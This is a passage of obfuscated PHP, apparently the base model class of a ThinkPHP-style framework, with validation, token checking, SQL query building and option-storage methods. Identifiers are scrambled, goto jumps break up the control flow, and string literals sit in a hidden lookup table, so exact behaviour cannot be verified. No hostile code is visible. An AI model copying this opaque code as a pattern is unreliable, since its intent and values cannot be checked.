unset($this->options[$a†‘¾§Ö“ù[257]]); } elseif ($fÆ©…‰‚ == THINK_MODEL_INSERT && isset($this->insertFields)) { $a–äî±ÑÇä = $this->insertFields; } elseif ($fÆ©…‰‚ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $a–äî±ÑÇä = $this->updateFields; } goto AÆäÑîôî; A÷ Ü°äÂ”: return $EëâôàÈ£; goto c–Îøø ®; bêš’ßîƒï: $a†‘¾§Ö“ù =& $_SERVER[Ä¿Ş°¨]; if (empty($EëâôàÈ£)) { $EëâôàÈ£ = $_POST; } elseif (is_object($EëâôàÈ£)) { $EëâôàÈ£ = get_object_vars($EëâôàÈ£); } if (empty($EëâôàÈ£) || !is_array($EëâôàÈ£)) { $this->error = think_lang($a†‘¾§Ö“ù[255]); return !1; } goto fï¤ê¼Æë‰; bİ…Õ¦ˆóç: if ($this->autoCheckFields) { $a–äî±ÑÇä = $this->getDbFields(); foreach ($EëâôàÈ£ as $BÅä¿÷âÜ› => $A¾‹„˜ô‡) { if (!in_array($BÅä¿÷âÜ›, $a–äî±ÑÇä)) { unset($EëâôàÈ£[$BÅä¿÷âÜ›]); } elseif (MAGIC_QUOTES_GPC && is_string($A¾‹„˜ô‡)) { $EëâôàÈ£[$BÅä¿÷âÜ›] = stripslashes($A¾‹„˜ô‡); } } } $this->autoOperation($EëâôàÈ£, $fÆ©…‰‚); $this->data = $EëâôàÈ£; goto A÷ Ü°äÂ”; c–Îøø ®: } public function autoCheckToken($BÊç­ò¦“ß) { $Aö‘ÑîÆğ =& $_SERVER[Ä¿Ş°¨]; if (isset($this->options[$Aö‘ÑîÆğ[285]]) && !$this->options[$Aö‘ÑîÆğ[285]]) { return !0; } if (think_config($Aö‘ÑîÆğ[282])) { $BÚÛ„ˆë“ = think_config($Aö‘ÑîÆğ[283]); if (!isset($BÊç­ò¦“ß[$BÚÛ„ˆë“]) || Session::get($BÚÛ„ˆë“)) { return !1; } list($a«œãˆÀº“, $Eß’¤¹¸òè) = explode($Aö‘ÑîÆğ[70], $BÊç­ò¦“ß[$BÚÛ„ˆë“]); if ($Eß’¤¹¸òè && Session::get($BÚÛ„ˆë“ . $Aö‘ÑîÆğ[91] . $a«œãˆÀº“) === $Eß’¤¹¸òè) { Session::remove($BÚÛ„ˆë“ . $Aö‘ÑîÆğ[91] . $a«œãˆÀº“); return !0; } if (think_config($Aö‘ÑîÆğ[286])) { Session::remove($BÚÛ„ˆë“ . $Aö‘ÑîÆğ[91] . $a«œãˆÀº“); } return !1; } return !0; } public function regex($bŒŠ»Áó‡Œ, $BÔö½´ğè…) { $c“ï½Çî×Ø =& $_SERVER[Ä¿Ş°¨]; $Añ³õ²øô÷ = array($c“ï½Çî×Ø[287] => $c“ï½Çî×Ø[288], $c“ï½Çî×Ø[289] => $c“ï½Çî×Ø[290], $c“ï½Çî×Ø[291] => $c“ï½Çî×Ø[292], $c“ï½Çî×Ø[293] => $c“ï½Çî×Ø[294], $c“ï½Çî×Ø[295] => $c“ï½Çî×Ø[296], $c“ï½Çî×Ø[297] => $c“ï½Çî×Ø[298], $c“ï½Çî×Ø[299] => $c“ï½Çî×Ø[300], $c“ï½Çî×Ø[274] => $c“ï½Çî×Ø[301], $c“ï½Çî×Ø[302] => $c“ï½Çî×Ø[303]); if (isset($Añ³õ²øô÷[strtolower($BÔö½´ğè…)])) { $BÔö½´ğè… = $Añ³õ²øô÷[strtolower($BÔö½´ğè…)]; } return preg_match($BÔö½´ğè…, $bŒŠ»Áó‡Œ) === 1; } private function autoOperation(&$E âºÅÇ, $eÊŸ¢ãÀÌ–) { $eÎ°…›ßÁ =& $_SERVER[Ä¿Ş°¨]; if (!empty($this->options[$eÎ°…›ßÁ[304]])) { $Aöà÷§ÄÚÍ = $this->options[$eÎ°…›ßÁ[304]]; unset($this->options[$eÎ°…›ßÁ[304]]); } elseif (!empty($this->_auto)) { $Aöà÷§ÄÚÍ = $this->_auto; } if (isset($Aöà÷§ÄÚÍ)) { foreach ($Aöà÷§ÄÚÍ as $aåŞ¨Í÷Œğ) { if (empty($aåŞ¨Í÷Œğ[2])) { $aåŞ¨Í÷Œğ[2] = THINK_MODEL_INSERT; } if ($eÊŸ¢ãÀÌ– == $aåŞ¨Í÷Œğ[2] || $aåŞ¨Í÷Œğ[2] == THINK_MODEL_BOTH) { switch (trim($aåŞ¨Í÷Œğ[3])) { case $eÎ°…›ßÁ[305]: case $eÎ°…›ßÁ[306]: $F”¬÷åóƒ« = isset($aåŞ¨Í÷Œğ[4]) ? (array) $aåŞ¨Í÷Œğ[4] : array(); if (isset($E âºÅÇ[$aåŞ¨Í÷Œğ[0]])) { array_unshift($F”¬÷åóƒ«, $E âºÅÇ[$aåŞ¨Í÷Œğ[0]]); } if ($eÎ°…›ßÁ[305] == $aåŞ¨Í÷Œğ[3]) { $E âºÅÇ[$aåŞ¨Í÷Œğ[0]] = call_user_func_array($aåŞ¨Í÷Œğ[1], $F”¬÷åóƒ«); } else { $E âºÅÇ[$aåŞ¨Í÷Œğ[0]] = call_user_func_array(array(&$this, $aåŞ¨Í÷Œğ[1]), $F”¬÷åóƒ«); } break; case $eÎ°…›ßÁ[257]: $E âºÅÇ[$aåŞ¨Í÷Œğ[0]] = $E âºÅÇ[$aåŞ¨Í÷Œğ[1]]; break; case $eÎ°…›ßÁ[307]: if ($eÎ°…›ßÁ[33] === $E âºÅÇ[$aåŞ¨Í÷Œğ[0]]) { unset($E âºÅÇ[$aåŞ¨Í÷Œğ[0]]); } break; case $eÎ°…›ßÁ[308]: default: $E âºÅÇ[$aåŞ¨Í÷Œğ[0]] = $aåŞ¨Í÷Œğ[1]; } if (!1 === $E âºÅÇ[$aåŞ¨Í÷Œğ[0]]) { unset($E âºÅÇ[$aåŞ¨Í÷Œğ[0]]); } } } } return $E âºÅÇ; } protected function autoValidation($DáËí¯èä, $c¨Šá¹‘ò¸) { $Aˆ±‰ğŒªÜ =& $_SERVER[Ä¿Ş°¨]; if (!empty($this->options[$Aˆ±‰ğŒªÜ[309]])) { $fî¬Ã¨Ï²Á = $this->options[$Aˆ±‰ğŒªÜ[309]]; unset($this->options[$Aˆ±‰ğŒªÜ[309]]); } elseif (!empty($this->_validate)) { $fî¬Ã¨Ï²Á = $this->_validate; } if (isset($fî¬Ã¨Ï²Á)) { if ($this->patchValidate) { $this->error = array(); } foreach ($fî¬Ã¨Ï²Á as $AØÚÃÏ‡– => $b…ÛÅÂ±ğ‰) { if (empty($b…ÛÅÂ±ğ‰[5]) || $b…ÛÅÂ±ğ‰[5] == THINK_MODEL_BOTH || $b…ÛÅÂ±ğ‰[5] == $c¨Šá¹‘ò¸) { if (0 == strpos($b…ÛÅÂ±ğ‰[2], $Aˆ±‰ğŒªÜ[310]) && strpos($b…ÛÅÂ±ğ‰[2], $Aˆ±‰ğŒªÜ[311])) { $b…ÛÅÂ±ğ‰[2] = think_lang(substr($b…ÛÅÂ±ğ‰[2], 2, -1)); } $b…ÛÅÂ±ğ‰[3] = isset($b…ÛÅÂ±ğ‰[3]) ? $b…ÛÅÂ±ğ‰[3] : THINK_EXISTS_VALIDATE; $b…ÛÅÂ±ğ‰[4] = isset($b…ÛÅÂ±ğ‰[4]) ? $b…ÛÅÂ±ğ‰[4] : $Aˆ±‰ğŒªÜ[312]; switch ($b…ÛÅÂ±ğ‰[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($DáËí¯èä, $b…ÛÅÂ±ğ‰)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Aˆ±‰ğŒªÜ[33] != trim($DáËí¯èä[$b…ÛÅÂ±ğ‰[0]])) { if (!1 === $this->_validationField($DáËí¯èä, $b…ÛÅÂ±ğ‰)) { return !1; } } break; default: if (isset($DáËí¯èä[$b…ÛÅÂ±ğ‰[0]])) { if (!1 === $this->_validationField($DáËí¯èä, $b…ÛÅÂ±ğ‰)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($c°óĞ¦ƒ•†, $fğ†¤Ä°ñ”) { if (!1 === $this->_validationFieldItem($c°óĞ¦ƒ•†, $fğ†¤Ä°ñ”)) { if ($this->patchValidate) { $this->error[$fğ†¤Ä°ñ”[0]] = $fğ†¤Ä°ñ”[2]; } else { $this->error = $fğ†¤Ä°ñ”[2]; return !1; } } return; } protected function _validationFieldItem($dîîò¸­Š, $a¿Î£İëÉ) { $b¨Á÷Ùë›½ =& $_SERVER[Ä¿Ş°¨]; switch (strtolower(trim($a¿Î£İëÉ[4]))) { case $b¨Á÷Ùë›½[305]: case $b¨Á÷Ùë›½[306]: $eÛÓ…ß™¤ = isset($a¿Î£İëÉ[6]) ? (array) $a¿Î£İëÉ[6] : array(); if (is_string($a¿Î£İëÉ[0]) && strpos($a¿Î£İëÉ[0], $b¨Á÷Ùë›½[47])) { $a¿Î£İëÉ[0] = explode($b¨Á÷Ùë›½[47], $a¿Î£İëÉ[0]); } if (is_array($a¿Î£İëÉ[0])) { foreach ($a¿Î£İëÉ[0] as $FäÏÂÂ–»Ù) { $D„ï·ôÎõĞ[$FäÏÂÂ–»Ù] = $dîîò¸­Š[$FäÏÂÂ–»Ù]; } array_unshift($eÛÓ…ß™¤, $D„ï·ôÎõĞ); } else { array_unshift($eÛÓ…ß™¤, $dîîò¸­Š[$a¿Î£İëÉ[0]]); } if ($b¨Á÷Ùë›½[305] == $a¿Î£İëÉ[4]) { return call_user_func_array($a¿Î£İëÉ[1], $eÛÓ…ß™¤); } else { return call_user_func_array(array(&$this, $a¿Î£İëÉ[1]), $eÛÓ…ß™¤); } case $b¨Á÷Ùë›½[313]: return $dîîò¸­Š[$a¿Î£İëÉ[0]] == $dîîò¸­Š[$a¿Î£İëÉ[1]]; case $b¨Á÷Ùë›½[314]: if (is_string($a¿Î£İëÉ[0]) && strpos($a¿Î£İëÉ[0], $b¨Á÷Ùë›½[47])) { $a¿Î£İëÉ[0] = explode($b¨Á÷Ùë›½[47], $a¿Î£İëÉ[0]); } $A›ŞÊˆ‰™î = array(); if (is_array($a¿Î£İëÉ[0])) { foreach ($a¿Î£İëÉ[0] as $FäÏÂÂ–»Ù) { $A›ŞÊˆ‰™î[$FäÏÂÂ–»Ù] = $dîîò¸­Š[$FäÏÂÂ–»Ù]; } } else { $A›ŞÊˆ‰™î[$a¿Î£İëÉ[0]] = $dîîò¸­Š[$a¿Î£İëÉ[0]]; } if (!empty($dîîò¸­Š[$this->getPk()])) { $A›ŞÊˆ‰™î[$this->getPk()] = array($b¨Á÷Ùë›½[315], $dîîò¸­Š[$this->getPk()]); } if ($this->where($A›ŞÊˆ‰™î)->find()) { return !1; } return !0; default: return $this->check($dîîò¸­Š[$a¿Î£İëÉ[0]], $a¿Î£İëÉ[1], $a¿Î£İëÉ[4]); } } public function check($aÄìÃˆŞÅ‚, $Dò­¨›á¶ì, $cÊØç¢Î¥Ò = "\162\x65\147\145\170") { $Cø¬ÆËÚ·ì =& $_SERVER[Ä¿Ş°¨]; $cÊØç¢Î¥Ò = strtolower(trim($cÊØç¢Î¥Ò)); switch ($cÊØç¢Î¥Ò) { case $Cø¬ÆËÚ·ì[7]: case $Cø¬ÆËÚ·ì[316]: $BÑ¾İ«á–“ = is_array($Dò­¨›á¶ì) ? $Dò­¨›á¶ì : explode($Cø¬ÆËÚ·ì[47], $Dò­¨›á¶ì); return $cÊØç¢Î¥Ò == $Cø¬ÆËÚ·ì[7] ? in_array($aÄìÃˆŞÅ‚, $BÑ¾İ«á–“) : !in_array($aÄìÃˆŞÅ‚, $BÑ¾İ«á–“); case $Cø¬ÆËÚ·ì[317]: case $Cø¬ÆËÚ·ì[318]: if (is_array($Dò­¨›á¶ì)) { $Dó‚”Œ½İÑ = $Dò­¨›á¶ì[0]; $F‚¥‡åª§® = $Dò­¨›á¶ì[1]; } else { list($Dó‚”Œ½İÑ, $F‚¥‡åª§®) = explode($Cø¬ÆËÚ·ì[47], $Dò­¨›á¶ì); } return $cÊØç¢Î¥Ò == $Cø¬ÆËÚ·ì[317] ? $aÄìÃˆŞÅ‚ >= $Dó‚”Œ½İÑ && $aÄìÃˆŞÅ‚ <= $F‚¥‡åª§® : $aÄìÃˆŞÅ‚ < $Dó‚”Œ½İÑ || $aÄìÃˆŞÅ‚ > $F‚¥‡åª§®; case $Cø¬ÆËÚ·ì[319]: case $Cø¬ÆËÚ·ì[320]: return $cÊØç¢Î¥Ò == $Cø¬ÆËÚ·ì[319] ? $aÄìÃˆŞÅ‚ == $Dò­¨›á¶ì : $aÄìÃˆŞÅ‚ != $Dò­¨›á¶ì; case $Cø¬ÆËÚ·ì[321]: $dò­ßàíŸ = mb_strlen($aÄìÃˆŞÅ‚, $Cø¬ÆËÚ·ì[322]); if (strpos($Dò­¨›á¶ì, $Cø¬ÆËÚ·ì[47])) { list($Dó‚”Œ½İÑ, $F‚¥‡åª§®) = explode($Cø¬ÆËÚ·ì[47], $Dò­¨›á¶ì); return $dò­ßàíŸ >= $Dó‚”Œ½İÑ && $dò­ßàíŸ <= $F‚¥‡åª§®; } else { return $dò­ßàíŸ == $Dò­¨›á¶ì; } case $Cø¬ÆËÚ·ì[323]: list($Fæª”†ÊòÓ, $aŞÇç««‹¼) = explode($Cø¬ÆËÚ·ì[47], $Dò­¨›á¶ì); if (!is_numeric($Fæª”†ÊòÓ)) { $Fæª”†ÊòÓ = strtotime($Fæª”†ÊòÓ); } if (!is_numeric($aŞÇç««‹¼)) { $aŞÇç««‹¼ = strtotime($aŞÇç««‹¼); } return NOW_TIME >= $Fæª”†ÊòÓ && NOW_TIME <= $aŞÇç««‹¼; case $Cø¬ÆËÚ·ì[324]: return in_array(get_client_ip(), explode($Cø¬ÆËÚ·ì[47], $Dò­¨›á¶ì)); case $Cø¬ÆËÚ·ì[325]: return !in_array(get_client_ip(), explode($Cø¬ÆËÚ·ì[47], $Dò­¨›á¶ì)); case $Cø¬ÆËÚ·ì[312]: default: return $this->regex($aÄìÃˆŞÅ‚, $Dò­¨›á¶ì); } } public function query($F¡†µÙ³·, $dš…²º“² = false) { $DÁšÌƒÆ²‰ =& $_SERVER[Ä¿Ş°¨]; if (!is_bool($dš…²º“²) && !is_array($dš…²º“²)) { $dš…²º“² = func_get_args(); array_shift($dš…²º“²); } $F¡†µÙ³· = str_replace(array($DÁšÌƒÆ²‰[213], $DÁšÌƒÆ²‰[326]), $DÁšÌƒÆ²‰[50], $F¡†µÙ³·); $F¡†µÙ³· = $this->parseSql($F¡†µÙ³·, $dš…²º“²); return $this->db->query($F¡†µÙ³·); } public function execute($eÖ¹ÍôÒ², $fÆÃÅ•°…ò = false) { if (!is_bool($fÆÃÅ•°…ò) && !is_array($fÆÃÅ•°…ò)) { $fÆÃÅ•°…ò = func_get_args(); array_shift($fÆÃÅ•°…ò); } $eÖ¹ÍôÒ² = $this->parseSql($eÖ¹ÍôÒ², $fÆÃÅ•°…ò); return $this->db->execute($eÖ¹ÍôÒ²); } protected function parseSql($bÊ¦íØ®Ûï, $F¤Ú„¥¯…) { $B´ÖĞàœÅÕ =& $_SERVER[Ä¿Ş°¨]; if (!0 === $F¤Ú„¥¯…) { $b¶ÅÛ¥¢éÁ = $this->_parseOptions(); $bÊ¦íØ®Ûï = $this->db->parseSql($bÊ¦íØ®Ûï, $b¶ÅÛ¥¢éÁ); } elseif (is_array($F¤Ú„¥¯…)) { $F¤Ú„¥¯… = array_map(array($this->db, $B´ÖĞàœÅÕ[327]), $F¤Ú„¥¯…); $bÊ¦íØ®Ûï = vsprintf($bÊ¦íØ®Ûï, $F¤Ú„¥¯…); } else { $bÊ¦íØ®Ûï = strtr($bÊ¦íØ®Ûï, array($B´ÖĞàœÅÕ[328] => $this->getTableName(), $B´ÖĞàœÅÕ[329] => think_config($B´ÖĞàœÅÕ[228]))); } $this->db->setModel($this->name); return $bÊ¦íØ®Ûï; } public function db($Dé±å©« = '', $D‰”Ä Ó† = '', $AÈ ËñÉÖ = array()) { goto bØÂ×ãŸ÷—; eæ­ßÚÌ˜¸: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto b‘ŠŠ‰µ†˜; bØÂ×ãŸ÷—: $f³ÚÏåœ =& $_SERVER[Ä¿Ş°¨]; if ($f³ÚÏåœ[33] === $Dé±å©« && $this->db) { return $this->db; } static $d•½˜Óğ‘ô = array(); goto C© Í¡´Š‚; C© Í¡´Š‚: static $e•Ÿø´‡Ãİ = array(); if (!isset($e•Ÿø´‡Ãİ[$Dé±å©«]) || isset($e•Ÿø´‡Ãİ[$Dé±å©«]) && $D‰”Ä Ó† && $d•½˜Óğ‘ô[$Dé±å©«] != $D‰”Ä Ó†) { if (!empty($D‰”Ä Ó†) && is_string($D‰”Ä Ó†) && !1 === strpos($D‰”Ä Ó†, $f³ÚÏåœ[8])) { $D‰”Ä Ó† = think_config($D‰”Ä Ó†); } $e•Ÿø´‡Ãİ[$Dé±å©«] = Db::getInstance($D‰”Ä Ó†); } elseif (NULL === $D‰”Ä Ó†) { $e•Ÿø´‡Ãİ[$Dé±å©«]->close(); unset($e•Ÿø´‡Ãİ[$Dé±å©«]); return; } if (!empty($AÈ ËñÉÖ)) { if (is_string($AÈ ËñÉÖ)) { parse_str($AÈ ËñÉÖ, $AÈ ËñÉÖ); } foreach ($AÈ ËñÉÖ as $cÃš‡Ë‹ => $aŞÍ†Å”Œƒ) { $this->setProperty($cÃš‡Ë‹, $aŞÍ†Å”Œƒ); } } goto FàãğÀôÅÚ; FàãğÀôÅÚ: $d•½˜Óğ‘ô[$Dé±å©«] = $D‰”Ä Ó†; $this->db = $e•Ÿø´‡Ãİ[$Dé±å©«]; $this->_after_db(); goto eæ­ßÚÌ˜¸; b‘ŠŠ‰µ†˜: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Fª›ª†ÍÈ× = get_class($this); if ($Fª›ª†ÍÈ× == $_SERVER[Ä¿Ş°¨][330]) { return $this->name; } $this->name = substr($Fª›ª†ÍÈ×, 0, -5); } return $this->name; } public function getTableName() { $aèà–ÄòÃÔ =& $_SERVER[Ä¿Ş°¨]; if (empty($this->trueTableName)) { $F²¥ä­‹ÙÚ = !empty($this->tablePrefix) ? $this->tablePrefix : $aèà–ÄòÃÔ[33]; if (!empty($this->tableName)) { $F²¥ä­‹ÙÚ .= $this->tableName; } else { $F²¥ä­‹ÙÚ .= think_parse_name($this->name); } $this->trueTableName = strtolower($F²¥ä­‹ÙÚ); } return (!empty($this->dbName) ? $this->dbName . $aèà–ÄòÃÔ[91] : $aèà–ÄòÃÔ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $e¤íİè„Şá =& $_SERVER[Ä¿Ş°¨]; return isset($this->fields[$e¤íİè„Şá[235]]) ? $this->fields[$e¤íİè„Şá[235]] : $this->pk; } public function getDbFields() { $a±³Š§ÔÚ¤ =& $_SERVER[Ä¿Ş°¨]; if (isset($this->options[$a±³Š§ÔÚ¤[263]])) { $b„ˆÕ‚Íˆã = $this->db->getFields($this->options[$a±³Š§ÔÚ¤[263]]); return $b„ˆÕ‚Íˆã ? array_keys($b„ˆÕ‚Íˆã) : !1; } if ($this->fields) { $b„ˆÕ‚Íˆã = $this->fields; unset($b„ˆÕ‚Íˆã[$a±³Š§ÔÚ¤[234]], $b„ˆÕ‚Íˆã[$a±³Š§ÔÚ¤[235]], $b„ˆÕ‚Íˆã[$a±³Š§ÔÚ¤[236]], $b„ˆÕ‚Íˆã[$a±³Š§ÔÚ¤[233]]); return $b„ˆÕ‚Íˆã; } return !1; } public function data($cõù¸Î“÷ù = '') { $d˜à¤Êâ» =& $_SERVER[Ä¿Ş°¨]; if ($d˜à¤Êâ»[33] === $cõù¸Î“÷ù && !empty($this->data)) { return $this->data; } if (is_object($cõù¸Î“÷ù)) { $cõù¸Î“÷ù = get_object_vars($cõù¸Î“÷ù); } elseif (is_string($cõù¸Î“÷ù)) { parse_str($cõù¸Î“÷ù, $cõù¸Î“÷ù); } elseif (!is_array($cõù¸Î“÷ù)) { think_exception(think_lang($d˜à¤Êâ»[255])); } $this->data = $cõù¸Î“÷ù; return $this; } public function join($F•êÓ‰£Ëš) { $C¥‹º³Ùî =& $_SERVER[Ä¿Ş°¨]; if (is_array($F•êÓ‰£Ëš)) { $this->options[$C¥‹º³Ùî[266]] = $F•êÓ‰£Ëš; } elseif (!empty($F•êÓ‰£Ëš)) { $this->options[$C¥‹º³Ùî[266]][] = $F•êÓ‰£Ëš; } return $this; } public function union($dÆ†¦á×», $E“ì¤œÜ = false) { goto dÈàà‰Òä¹; D¼ì Óˆ: return $this; goto aÃğÈ‚À¿; dÈàà‰Òä¹: $aÌ‚¬ÓÈŠê =& $_SERVER[Ä¿Ş°¨]; if (empty($dÆ†¦á×»)) { return $this; } if ($E“ì¤œÜ) { $this->options[$aÌ‚¬ÓÈŠê[331]][$aÌ‚¬ÓÈŠê[332]] = !0; } goto a¥Í‘Šõ±; a¥Í‘Šõ±: if (is_object($dÆ†¦á×»)) { $dÆ†¦á×» = get_object_vars($dÆ†¦á×»); } if (is_string($dÆ†¦á×»)) { $D±š„š£Î‡ = $dÆ†¦á×»; } elseif (is_array($dÆ†¦á×»)) { if (isset($dÆ†¦á×»[0])) { $this->options[$aÌ‚¬ÓÈŠê[331]] = array_merge($this->options[$aÌ‚¬ÓÈŠê[331]], $dÆ†¦á×»); return $this; } else { $D±š„š£Î‡ = $dÆ†¦á×»; } } else { think_exception(think_lang($aÌ‚¬ÓÈŠê[255])); } $this->options[$aÌ‚¬ÓÈŠê[331]][] = $D±š„š£Î‡; goto D¼ì Óˆ; aÃğÈ‚À¿: } public function cache($F¸Â‡ÅáÌÏ = true, $Dá Ëê‘ = null, $C‚Ç¤šó‘° = '') { $a¢ê®»Œ =& $_SERVER[Ä¿Ş°¨]; if (!1 !== $F¸Â‡ÅáÌÏ) { $this->options[$a¢ê®»Œ[333]] = array($a¢ê®»Œ[89] => $F¸Â‡ÅáÌÏ, $a¢ê®»Œ[323] => $Dá Ëê‘, $a¢ê®»Œ[29] => $C‚Ç¤šó‘°); } return $this; } public function field($DÒãÚÒ›±Ş, $c°ºßèÕÚß = false) { $cß³˜óğÔ =& $_SERVER[Ä¿Ş°¨]; if (!0 === $DÒãÚÒ›±Ş) { $dø¿—¯‰È = $this->getDbFields(); $DÒãÚÒ›±Ş = $dø¿—¯‰È ? $dø¿—¯‰È : $cß³˜óğÔ[172]; } elseif ($c°ºßèÕÚß) { if (is_string($DÒãÚÒ›±Ş)) { $DÒãÚÒ›±Ş = explode($cß³˜óğÔ[47], $DÒãÚÒ›±Ş); } $dø¿—¯‰È = $this->getDbFields(); $DÒãÚÒ›±Ş = $dø¿—¯‰È ? array_diff($dø¿—¯‰È, $DÒãÚÒ›±Ş) : $DÒãÚÒ›±Ş; } $this->options[$cß³˜óğÔ[257]] = $DÒãÚÒ›±Ş; return $this; } public function scope($B¡Ô×ïÃóà = '', $B›ê‡é¿Î = NULL) { $dİâ“œ‘Ì =& $_SERVER[Ä¿Ş°¨]; if ($dİâ“œ‘Ì[33] === $B¡Ô×ïÃóà) { if (isset($this->_scope[$dİâ“œ‘Ì[34]])) { $bÚ¯ˆÏöÉÆ = $this->_scope[$dİâ“œ‘Ì[34]]; } else { return $this; } } elseif (is_string($B¡Ô×ïÃóà)) { $Cíï£ó½Õ = explode($dİâ“œ‘Ì[47], $B¡Ô×ïÃóà); $bÚ¯ˆÏöÉÆ = array(); foreach ($Cíï£ó½Õ as $DùÃ‹£ªŸ§) { if (!isset($this->_scope[$DùÃ‹£ªŸ§])) { continue; } $bÚ¯ˆÏöÉÆ = array_merge($bÚ¯ˆÏöÉÆ, $this->_scope[$DùÃ‹£ªŸ§]); } if (!empty($B›ê‡é¿Î) && is_array($B›ê‡é¿Î)) { $bÚ¯ˆÏöÉÆ = array_merge($bÚ¯ˆÏöÉÆ, $B›ê‡é¿Î); } } elseif (is_array($B¡Ô×ïÃóà)) { $bÚ¯ˆÏöÉÆ = $B¡Ô×ïÃóà; } if (is_array($bÚ¯ˆÏöÉÆ) && !empty($bÚ¯ˆÏöÉÆ)) { $this->options = array_merge($this->options, array_change_key_case($bÚ¯ˆÏöÉÆ)); } return $this; } public function where($BÔ“ÊØÃ×, $Fãš­”¦Æ¦ = null) { $CÎÃè“ËÆƒ =& $_SERVER[Ä¿Ş°¨]; if (!is_null($Fãš­”¦Æ¦) && is_string($BÔ“ÊØÃ×)) { if (!is_array($Fãš­”¦Æ¦)) { $Fãš­”¦Æ¦ = func_get_args(); array_shift($Fãš­”¦Æ¦); } $Fãš­”¦Æ¦ = array_map(array($this->db, $CÎÃè“ËÆƒ[327]), $Fãš­”¦Æ¦); $BÔ“ÊØÃ× = vsprintf($BÔ“ÊØÃ×, $Fãš­”¦Æ¦); } elseif (is_object($BÔ“ÊØÃ×)) { $BÔ“ÊØÃ× = get_object_vars($BÔ“ÊØÃ×); } elseif (is_array($BÔ“ÊØÃ×)) { foreach ($BÔ“ÊØÃ× as $a ’ëø”É => $eµ°Ğ¹ƒéì) { if ((is_numeric($a ’ëø”É) || !$a ’ëø”É) && is_string($eµ°Ğ¹ƒéì)) { think_trace($CÎÃè“ËÆƒ[334], $CÎÃè“ËÆƒ[33], $CÎÃè“ËÆƒ[46]); die; } } } if (is_string($BÔ“ÊØÃ×) && $CÎÃè“ËÆƒ[33] != $BÔ“ÊØÃ×) { $eÍÕÚ¹¿æÇ = array(); $eÍÕÚ¹¿æÇ[$CÎÃè“ËÆƒ[335]] = $BÔ“ÊØÃ×; $BÔ“ÊØÃ× = $eÍÕÚ¹¿æÇ; } if (isset($this->options[$CÎÃè“ËÆƒ[259]])) { $this->options[$CÎÃè“ËÆƒ[259]] = array_merge($this->options[$CÎÃè“ËÆƒ[259]], $BÔ“ÊØÃ×); } else { $this->options[$CÎÃè“ËÆƒ[259]] = $BÔ“ÊØÃ×; } return $this; } public function limit($f’ˆõÃ‰·, $AÀŒ·˜Â–‚ = null) { $d®âŠ¤æ£Â =& $_SERVER[Ä¿Ş°¨]; $this->options[$d®âŠ¤æ£Â[276]] = is_null($AÀŒ·˜Â–‚) ? $f’ˆõÃ‰· : $f’ˆõÃ‰· . $d®âŠ¤æ£Â[47] . $AÀŒ·˜Â–‚; return $this; } public function page($AÙà÷‚ªâ, $DƒÙğÄïë« = null) { $a³œùƒ™” =& $_SERVER[Ä¿Ş°¨]; $this->options[$a³œùƒ™”[336]] = is_null($DƒÙğÄïë«) ? $AÙà÷‚ªâ : $AÙà÷‚ªâ . $a³œùƒ™”[47] . $DƒÙğÄïë«; return $this; } public function comment($AÍº°‹ñ·Ø) { $this->options[$_SERVER[Ä¿Ş°¨][337]] = $AÍº°‹ñ·Ø; return $this; } public function setProperty($D‰™¤³•íö, $EêÒå¶§È¯) { if (property_exists($this, $D‰™¤³•íö)) { $this->{$D‰™¤³•íö} = $EêÒå¶§È¯; } return $this; } } goto D‹°¿——÷Â; a­¾Ì»±¼•: function beforeShutdown() { Hook::trigger($_SERVER[£›Åú§µ][36]); } $_SERVER[$_SERVER[£›Åú§µ][37]] = BASIC_PATH; $_SERVER[$_SERVER[£›Åú§µ][38]] = LIB_DIR; goto FÜ¦„£š¹Ö; E¾›Ÿò¡: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($d”Œ»ÂÒ¿‚ = false, $cëÚô…í¸‰ = '', $eˆÌœéçëô = false) { goto Eë®½‰¡; cÊÚªîóµ: $this->cacheSet($cëÚô…í¸‰, $Cö–İğçë); $Cö–İğçë = array_merge($fª˜êÇÌ”, $Cö–İğçë); return $d”Œ»ÂÒ¿‚ ? $Cö–İğçë[$d”Œ»ÂÒ¿‚] : $Cö–İğçë; goto d‰…çòŠ½Ê; Eë®½‰¡: $Ağ»Êó°Æò =& $_SERVER[Ä¿Ş°¨]; $Cö–İğçë = $this->cacheGet($cëÚô…í¸‰); $fª˜êÇÌ” = $this->optionDefault($cëÚô…í¸‰); goto AîÒïÛÛÈŸ; D—‰£‚á®: $Cö–İğçë = $this->where($cİê˜ˆ÷¯Á)->select(); $Cö–İğçë = array_to_keyvalue($Cö–İğçë, $Ağ»Êó°Æò[89], $Ağ»Êó°Æò[355]); foreach ($Cö–İğçë as $C²Ê—Ëª¾ => $d†º÷éÁšØ) { if ($eˆÌœéçëô || in_array($C²Ê—Ëª¾, $this->jsonField)) { $Cö–İğçë[$C²Ê—Ëª¾] = json_decode($d†º÷éÁšØ, !0); } } goto cÊÚªîóµ; AîÒïÛÛÈŸ: $fª˜êÇÌ” = is_array($fª˜êÇÌ”) ? $fª˜êÇÌ” : array(); if (is_array($Cö–İğçë)) { $Cö–İğçë = array_merge($fª˜êÇÌ”, $Cö–İğçë); return $d”Œ»ÂÒ¿‚ ? isset($Cö–İğçë[$d”Œ»ÂÒ¿‚]) ? $Cö–İğçë[$d”Œ»ÂÒ¿‚] : null : $Cö–İğçë; } $cİê˜ˆ÷¯Á = $this->filterWhere(array($Ağ»Êó°Æò[29] => $cëÚô…í¸‰)); goto D—‰£‚á®; d‰…çòŠ½Ê: } public function set($dğ”ÔÔåŒ¿, $d„èƒœ¢ª = false, $BäÏßÅ¶»Ø = '') { goto Eä¶„Íä; eñÃ³í‹Ì²: return $this->addAll($aîòÒæ»†, array(), !0); goto BùÛŞ¤…É; Eä¶„Íä: $bàÅàÅ„›ö =& $_SERVER[Ä¿Ş°¨]; 